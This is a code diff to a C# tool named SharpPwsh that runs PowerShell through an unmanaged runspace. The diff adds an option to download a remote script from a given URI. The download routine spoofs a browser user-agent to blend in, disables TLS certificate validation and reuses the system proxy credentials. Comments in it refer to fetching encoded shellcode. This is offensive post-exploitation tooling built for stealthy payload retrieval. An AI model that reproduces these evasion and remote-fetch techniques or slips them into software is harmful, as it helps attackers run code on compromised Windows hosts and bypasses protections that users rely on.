@@ -2,6 +2,7 @@
 using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.Net;
 using CommandLine;
 
 // need to add as reference:
@@ -15,12 +16,19 @@ namespace SharpPwsh
         {
             [Option('c', "cmd", Required = true, HelpText = "Powershell command to run")]
             public string inputCmd { get; set; }
+            [Option('u', "uri", Required = false, HelpText = "URI to fetch remote script")]
+            public string inputUri { get; set; }
         }
         static void Main(string[] args)
         {
             Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
             {
-
+                string inputURI = o.inputUri;
+                if (args.Contains(inputURI))
+                {
+                    Console.WriteLine("fetch " + inputURI);
+                    FetchURI(inputURI);
+                }
                 Runspace rs = RunspaceFactory.CreateRunspace();
                 rs.Open();
 
@@ -29,7 +37,11 @@ namespace SharpPwsh
                 ps.Runspace = rs;
 
                 string cmd = o.inputCmd;
-                if (String.IsNullOrWhiteSpace(cmd)) return;
+                if (String.IsNullOrWhiteSpace(cmd))
+                {
+                    Console.WriteLine("error: command string not supplied");
+                    return;
+                }
                 ps.AddScript(cmd);
                 ps.AddCommand("Out-String");
                 PSDataCollection<object> results = new PSDataCollection<object>();
@@ -69,6 +81,31 @@ namespace SharpPwsh
 
                 rs.Close();
             });
+        }
+
+        public static string FetchURI(string url)
+        {
+            try
+            {
+                // fuck ciphers
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+                WebClient client = new WebClient();
+                // hood up
+                client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
+                // yeah yeah
+                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+                client.Proxy = WebRequest.GetSystemWebProxy();
+                client.Proxy.Credentials = CredentialCache.DefaultCredentials;
+                string responseString = client.DownloadString(url);
+                //return Convert.FromBase64String(compressedEncodedShellcode);
+                return responseString;
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace);
+                //var ret = new byte[] { 0xC3 };
+                return null;
+            }
         }
     }
 }
